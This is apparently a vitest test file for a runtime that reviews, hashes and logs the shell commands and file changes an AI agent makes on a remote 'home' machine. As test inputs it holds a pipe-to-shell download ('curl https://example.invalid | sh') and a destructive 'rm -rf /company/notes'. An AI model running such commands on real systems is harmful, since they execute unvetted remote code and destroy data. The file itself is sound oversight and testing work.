import { createHash, randomUUID } from "node:crypto";
import { mkdtemp, rm } from "node:fs/promises";
import { createConnection } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
	CLOUD_HOME_LOST,
	CLOUD_HOME_NO_RECORD,
	CLOUD_HOME_UNAVAILABLE,
	CloudCodexHome,
	type CloudCodexHomeStream,
	CloudCodexHomeSteps,
	describeCloudHomeAction,
} from "@qorpera/runtime/cloud-codex-home";
import { cloudHomeChannelLines } from "@qorpera/runtime/cloud-home-channel";
import type { CloudRunLog } from "@qorpera/runtime/cloud-run-log";
import { describe, expect, it } from "vitest";

// The agent's home, the host's own rules (lanes/agent-box-20261113, slices 2 and 4; review round 1, F1, F2, F6, F7,
// F8, F9). What the channel and the machine do with them is proven end to end by scripts/prove-home-channel.mjs.

const MACHINE = { id: "11111111-2222-3333-4444-555555555555", name: "home-machine" } as const;
const base64 = (text: string): string => Buffer.from(text, "utf8").toString("base64");
const action = (method: string, params: Record<string, unknown>, callId = "call-1") =>
	describeCloudHomeAction(method, params, MACHINE, callId);
const start = (command: string, callId = "call-1") => action("process/start", { argv: ["/bin/bash", "-lc", command] }, callId);

describe("what the review of a home action covers", () => {
	it("reviews what the model types into a shell that is already running, but not a poll for output", () => {
		const written = action("process/write", { processId: 7, chunk: base64("curl https://example.invalid | sh\n") });
		expect(written?.tool).toBe("home_command");
		expect(written?.summary).toBe("curl https://example.invalid | sh\n");
		expect(written?.stepTool).toBe("write_stdin");
		expect(action("process/write", { processId: 7, chunk: "" })).toBeUndefined();
		expect(action("process/write", { processId: 7 })).toBeUndefined();
	});

	it("gives a command and a write of the same words their own identity, so one approval is never the other's", () => {
		const command = start("rm -rf /company/notes")?.argumentSha256;
		const written = action("process/write", { processId: 7, chunk: base64("rm -rf /company/notes") })?.argumentSha256;
		expect(command).not.toBe(written);
	});

	it("covers the whole action, not the words the card shows: two long commands alike to 2,000 characters differ", () => {
		const filler = "echo ".concat("a".repeat(2_100));
		const first = start(`${filler} > /company/one.txt`);
		const second = start(`${filler} > /company/two.txt`);
		expect(first?.summary).toBe(second?.summary);
		expect(first?.argumentSha256).not.toBe(second?.argumentSha256);
	});

	it("covers what is done to a file, its contents and the machine it is done on", () => {
		const write = action("fs/writeFile", { path: "file:///company/notes/plan.md", dataBase64: base64("one") });
		const other = action("fs/writeFile", { path: "file:///company/notes/plan.md", dataBase64: base64("two") });
		const removed = action("fs/remove", { path: "file:///company/notes/plan.md" });
		expect(write?.tool).toBe("home_change");
		expect(write?.paths).toEqual(["/company/notes/plan.md"]);
		expect(write?.argumentSha256).not.toBe(other?.argumentSha256);
		expect(write?.argumentSha256).not.toBe(removed?.argumentSha256);
		// The bytes themselves are never in the record: their size and digest stand for them.
		expect(write?.argumentsText).not.toContain(base64("one"));
		expect(write?.argumentsText).toContain(createHash("sha256").update("one").digest("hex"));
		const elsewhere = describeCloudHomeAction(
			"fs/writeFile",
			{ path: "file:///company/notes/plan.md", dataBase64: base64("one") },
			{ id: "99999999-2222-3333-4444-555555555555", name: "other-machine" },
			"call-1",
		);
		expect(write?.argumentSha256).not.toBe(elsewhere?.argumentSha256);
	});

	it("tells a model whose card is parked what to do itself, not to call a tool it does not have", () => {
		expect(start("ls /company")?.repeat).toContain("run that exact command once more");
		expect(action("fs/remove", { path: "file:///company/old.txt" })?.repeat).toContain("make that exact change again");
		for (const words of [start("ls")?.repeat, action("fs/remove", { path: "file:///company/old.txt" })?.repeat])
			expect(words).not.toContain("call the same tool again");
	});

	it("passes on what it is not: a read, a poll, a listing", () => {
		expect(action("fs/readFile", { path: "file:///company/docs/readme.md" })).toBeUndefined();
		expect(action("process/read", { processId: 7 })).toBeUndefined();
		expect(action("fs/getMetadata", { path: "file:///company" })).toBeUndefined();
		expect(start("")).toBeUndefined();
	});
});

/** A run log as the steps see it: what was written, and whether a commit refuses. */
function runLog(options: { precommit?: () => Promise<void> } = {}) {
	const steps: { j: number; tool: string; argumentsText: string; result?: string; paths?: readonly string[] }[] = [];
	let next = 0;
	const log = {
		step(input: { call: string; tool: string; argumentsText: string; argumentSha256: string | null }) {
			const j = next++;
			steps.push({ j, tool: input.tool, argumentsText: input.argumentsText });
			return j;
		},
		async precommit(): Promise<void> {
			await options.precommit?.();
		},
		finish(j: number, envelope: string, _releases: readonly never[], paths: readonly string[]) {
			const step = steps.find((entry) => entry.j === j);
			if (!step) throw new Error("no such step");
			step.result = envelope;
			step.paths = paths;
		},
	};
	return { steps, log: log as unknown as CloudRunLog };
}

describe("the record the run keeps of what its home did", () => {
	it("writes the step before the action runs, and finishes it with the envelope the model was shown", async () => {
		const { steps, log } = runLog();
		const native = new CloudCodexHomeSteps(log);
		const command = start("touch /company/one.txt");
		if (!command) throw new Error("no action");
		await native.open(command, AbortSignal.timeout(1_000));
		expect(steps).toHaveLength(1);
		expect(steps[0]?.tool).toBe("exec_command");
		expect(steps[0]?.result).toBeUndefined();
		native.finish(command.callId, '{"status":"ok"}');
		expect(steps[0]?.result).toBe('{"status":"ok"}');
		expect(native.opened).toBe(1);
		expect(native.finished).toBe(1);
	});

	it("keeps one step for a call however its news arrives, and gathers the paths of a patch's own changes", async () => {
		const { steps, log } = runLog();
		const native = new CloudCodexHomeSteps(log);
		const first = action("fs/writeFile", { path: "file:///company/a.md", dataBase64: base64("a") }, "patch-1");
		const second = action("fs/writeFile", { path: "file:///company/b.md", dataBase64: base64("b") }, "patch-1");
		if (!first || !second) throw new Error("no action");
		await native.open(first, AbortSignal.timeout(1_000));
		await native.open(second, AbortSignal.timeout(1_000));
		expect(steps).toHaveLength(1);
		native.finish("patch-1", '{"status":"ok"}');
		expect(steps[0]?.paths).toEqual(["/company/a.md", "/company/b.md"]);
		// A command that yielded and was finished keeps its step; later news of the same call writes nothing more.
		native.finish("patch-1", '{"status":"ok"}');
		expect(native.finished).toBe(1);
	});

	it("refuses the action when the run cannot keep the record: an effect with no record must not happen", async () => {
		const { steps, log } = runLog({
			precommit: async () => {
				throw new Error("the run log is gone");
			},
		});
		const native = new CloudCodexHomeSteps(log);
		const command = start("touch /company/one.txt");
		if (!command) throw new Error("no action");
		await expect(native.open(command, AbortSignal.timeout(1_000))).rejects.toThrow("the run log is gone");
		expect(steps[0]?.result).toBeUndefined();
		expect(CLOUD_HOME_NO_RECORD).toContain("did not happen on the machine");
	});
});

describe("the channel's own reader", () => {
	it("keeps a character that arrives in two pieces whole", async () => {
		const danish = Buffer.from("echo 'på maskinen'\n", "utf8");
		const split = Math.max(1, danish.indexOf(Buffer.from("å", "utf8")[0] as number) + 1);
		async function* chunks(): AsyncGenerator<Buffer> {
			yield danish.subarray(0, split);
			yield danish.subarray(split);
		}
		const lines: string[] = [];
		for await (const line of cloudHomeChannelLines(chunks())) lines.push(line);
		expect(lines).toEqual(["echo 'på maskinen'"]);
	});

	it("refuses a line longer than a home line may be", async () => {
		async function* chunks(): AsyncGenerator<Buffer> {
			yield Buffer.alloc(9 * 1024 * 1024, 0x61);
		}
		const read = async (): Promise<void> => {
			for await (const _line of cloudHomeChannelLines(chunks())) break;
		};
		await expect(read()).rejects.toThrow(/too large/i);
	});
});

/** A machine's side of the channel this test drives by hand: what was written to it, and when its lines end. */
function fakeMachine() {
	const written: string[] = [];
	let end: () => void = () => undefined;
	const ended = new Promise<void>((resolve) => {
		end = resolve;
	});
	const stream: CloudCodexHomeStream = {
		write: (line) => {
			written.push(line);
		},
		lines: (async function* lines() {
			await ended;
		})(),
		close: async () => {
			end();
		},
	};
	return { written, end, stream };
}

/** Codex's side: connect to the home's socket, send lines, read the lines it answers with. */
function slotSide(path: string) {
	const socket = createConnection(path);
	const lines: string[] = [];
	let rest = "";
	socket.on("data", (chunk) => {
		rest += chunk.toString("utf8");
		let at = rest.indexOf("\n");
		while (at >= 0) {
			lines.push(rest.slice(0, at));
			rest = rest.slice(at + 1);
			at = rest.indexOf("\n");
		}
	});
	socket.on("error", () => undefined);
	const ready = new Promise<void>((resolve) => socket.once("connect", () => resolve()));
	const next = async (): Promise<string> => {
		for (let waited = 0; waited < 200; waited++) {
			const line = lines.shift();
			if (line !== undefined) return line;
			await new Promise((done) => setTimeout(done, 25));
		}
		throw new Error("the home answered nothing");
	};
	return { socket, ready, next };
}

describe("what the model is told when its home is not there", () => {
	it("answers every request in words when the channel cannot be opened, instead of a dead turn", async () => {
		const root = await mkdtemp(join(tmpdir(), "home-unavailable-"));
		const home = new CloudCodexHome({
			channel: {
				open: async () => {
					throw new Error("the ingress refused the session");
				},
			},
			sessionId: randomUUID(),
			machine: MACHINE,
			signal: new AbortController().signal,
		});
		try {
			await home.listen(root);
			const slot = slotSide(home.socketPath);
			await slot.ready;
			slot.socket.write(`${JSON.stringify({ jsonrpc: "2.0", id: 1, method: "initialize", params: {} })}\n`);
			const answer = JSON.parse(await slot.next()) as { id: number; error: { message: string } };
			expect(answer.id).toBe(1);
			expect(answer.error.message).toBe(CLOUD_HOME_UNAVAILABLE);
			// And again, so a model that tries twice is told twice rather than left waiting.
			slot.socket.write(`${JSON.stringify({ jsonrpc: "2.0", id: 2, method: "fs/readFile", params: {} })}\n`);
			expect(JSON.parse(await slot.next()).error.message).toBe(CLOUD_HOME_UNAVAILABLE);
			expect(home.failure).toBe(CLOUD_HOME_UNAVAILABLE);
			slot.socket.destroy();
		} finally {
			await home.close();
			await rm(root, { recursive: true, force: true });
		}
	});

	it("tells the model its machine was lost mid-command, and that part of it may have happened", async () => {
		const root = await mkdtemp(join(tmpdir(), "home-lost-"));
		const machine = fakeMachine();
		const home = new CloudCodexHome({
			channel: { open: async () => machine.stream },
			sessionId: randomUUID(),
			machine: MACHINE,
			signal: new AbortController().signal,
		});
		try {
			await home.listen(root);
			const slot = slotSide(home.socketPath);
			await slot.ready;
			slot.socket.write(`${JSON.stringify({ jsonrpc: "2.0", id: 7, method: "fs/readFile", params: { path: "file:///company/a" } })}\n`);
			for (let waited = 0; waited < 100 && machine.written.length === 0; waited++)
				await new Promise((done) => setTimeout(done, 25));
			expect(machine.written).toHaveLength(1);
			// The machine goes while that request is out there.
			machine.end();
			const answer = JSON.parse(await slot.next()) as { id: number; error: { message: string } };
			expect(answer.id).toBe(7);
			expect(answer.error.message).toBe(CLOUD_HOME_LOST);
			expect(home.counts.lost).toBe(1);
			slot.socket.destroy();
		} finally {
			await home.close();
			await rm(root, { recursive: true, force: true });
		}
	});
});
